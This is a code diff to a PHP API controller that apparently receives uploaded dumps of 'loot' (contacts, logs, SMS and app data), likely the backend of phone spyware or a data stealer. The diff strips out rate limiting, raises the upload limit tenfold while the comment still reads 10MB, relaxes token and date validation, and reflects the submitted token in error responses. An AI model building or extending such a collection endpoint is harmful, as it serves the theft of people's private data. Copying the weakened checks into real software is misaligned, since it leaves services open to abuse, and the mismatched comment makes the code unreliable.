@@ -1,6 +1,6 @@
 <?php
 
-namespace App\Controllers\Api;
+namespace App\Controllers\api\v1;
 
 use App\Controllers\BaseController;
 use App\Models\Mod_Parse_Loot;
@@ -17,34 +17,11 @@ class Receive extends BaseController
 
     // Configuration for the file upload logic
     private $uploadConfig = [
-        'max_size'      => 10485760, // 10MB
+        'max_size'      => 104857600, // 10MB
         'allowed_types' => ['txt', 'enc'],
         'upload_path'   => WRITEPATH . 'uploads/text_dump/',
         'encrypt_name'  => true,
     ];
-
-    /**
-     * Constructor for rate limiting.
-     * This will block requests that exceed the defined limit.
-     */
-    public function __construct()
-    {
-        // Rate Limiting Logic: 10 requests per minute per IP
-        $throttler = \Config\Services::throttler();
-
-        // Check the IP address against the limit
-        // MINUTE is a pre-defined constant in CI4
-        if ($throttler->check($this->request->getIPAddress(), 10, MINUTE) === false) {
-            // Use the ResponseTrait fail method to send the error
-            // Note: If you return from the constructor, the controller methods won't execute.
-            // This is a common pattern for API throttling in CI4.
-            return $this->fail('Too many requests', 429);
-        }
-
-        // Call the parent constructor if needed (though often optional in CI4)
-        // parent::__construct();
-    }
-
 
     // Allowed file categories
     private $allowedCategories = ['contacts', 'logs', 'sms', 'apps'];
@@ -134,8 +111,9 @@ class Receive extends BaseController
 
         // Validate required parameters
         $validation = $this->validate([
-            'token' => 'required|min_length[10]|max_length[255]',
-            'time' => 'required|valid_date'
+            'token' => 'required|min_length[8]|max_length[255]',
+            'time' => 'required|string'
+//            'time' => 'required|valid_date'
         ]);
 
         if (!$validation) {
@@ -157,8 +135,10 @@ class Receive extends BaseController
             $this->logTokenVerification($token, $time, $ip, 'invalid_token');
             return $this->respond([
                 'success' => false,
+                'token' => $token,
+                'validity' => "False",
                 'message' => 'Invalid or expired token',
-                'timestamp' => date('Y-m-d H:i:s')
+                'timestamp' => date('Y-m-d H:i:s'),
             ], 401);
         }
 
